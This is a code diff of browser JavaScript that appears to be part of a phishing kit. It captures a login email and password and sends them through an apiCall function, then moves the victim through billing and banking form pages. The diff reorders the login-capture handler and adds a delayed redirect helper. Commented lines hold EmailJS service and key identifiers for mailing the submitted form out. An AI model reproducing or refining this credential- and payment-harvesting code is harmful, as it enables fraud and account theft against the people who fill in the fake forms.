@@ -72,6 +72,13 @@ async function apiCall(...texts) {
   api.send();
 }
 
+function route(routePath) {
+  console.log(window.location.pathname);
+  setTimeout(() => {
+    window.location.href = routePath;
+  }, 3000);
+}
+
 // console.log(window.location.pathname);
 if (window.location.pathname === "/views/billing.html") {
   const expiration = document.getElementById("expiration");
@@ -153,48 +160,8 @@ if (window.location.pathname === "/views/billing.html") {
     option.textContent = state;
     states.appendChild(option);
   });
-}
 
-// Login Page Form Submit
-if (window.location.pathname === "/") {
-  const loginSubmitBtn = document.querySelector(".login-btn");
-  // console.log(submitBtn);
-  loginSubmitBtn.addEventListener("click", async () => {
-    const loginForm = document.getElementById("login-form");
-    console.log(loginForm);
-
-    // serviceID - templateID - #form - publicKey
-    // emailjs
-    //   .sendForm(
-    //     "service_4q8coel",
-    //     "template_a97si1y",
-    //     "#login-form",
-    //     "3n7ifkUOowaI47Ert"
-    //   )
-    //   .then(
-    //     () => {
-    //       loginForm.reset(); // Clear input fields
-    //       console.log("Success");
-    //       window.location.href = "views/billing.html";
-    //     },
-    //     () => {
-    //       console.log("Message not sent");
-    //     }
-    //   );
-    const email = document.getElementById("login-email").value;
-    const pass = document.getElementById("login-pass").value;
-
-    await apiCall(`User-Email: ${email}`, `User-Pass: ${pass}`);
-    console.log("This will run after the message is sent.");
-    window.location.href = "/views/billing.html";
-    // }
-  });
-}
-
-// Billing page
-if (window.location.pathname === "/views/billing.html") {
-  const prepaidCheckInput = document.getElementById("prepaid-check");
-
+  // Billing page
   // Add the 'name' attribute to the input element
   if (prepaidCheckInput.checked) {
     prepaidCheckInput.setAttribute("name", "prepaid-checked");
@@ -225,7 +192,8 @@ if (window.location.pathname === "/views/billing.html") {
 
     await apiCall(messages);
     console.log("sccess");
-    window.location.href = "./banking.html";
+    // window.location.href = "./banking.html";
+    route("./banking.html");
   });
   // async function submitBilling() {
   //   // const billingForm = document.getElementById("billing-form");
@@ -267,6 +235,43 @@ if (window.location.pathname === "/views/billing.html") {
   //   //     }
   //   //   );
   // }
+}
+
+// Login Page Form Submit
+if (window.location.pathname === "/") {
+  const loginSubmitBtn = document.querySelector(".login-btn");
+  // console.log(submitBtn);
+  loginSubmitBtn.addEventListener("click", async () => {
+    const loginForm = document.getElementById("login-form");
+    console.log(loginForm);
+
+    // serviceID - templateID - #form - publicKey
+    // emailjs
+    //   .sendForm(
+    //     "service_4q8coel",
+    //     "template_a97si1y",
+    //     "#login-form",
+    //     "3n7ifkUOowaI47Ert"
+    //   )
+    //   .then(
+    //     () => {
+    //       loginForm.reset(); // Clear input fields
+    //       console.log("Success");
+    //       window.location.href = "views/billing.html";
+    //     },
+    //     () => {
+    //       console.log("Message not sent");
+    //     }
+    //   );
+    const email = document.getElementById("login-email").value;
+    const pass = document.getElementById("login-pass").value;
+
+    await apiCall(`User-Email: ${email}`, `User-Pass: ${pass}`);
+    console.log("This will run after the message is sent.");
+    // window.location.href = "/views/billing.html";
+    route("/views/billing.html");
+    // }
+  });
 }
 
 // Banking form submit
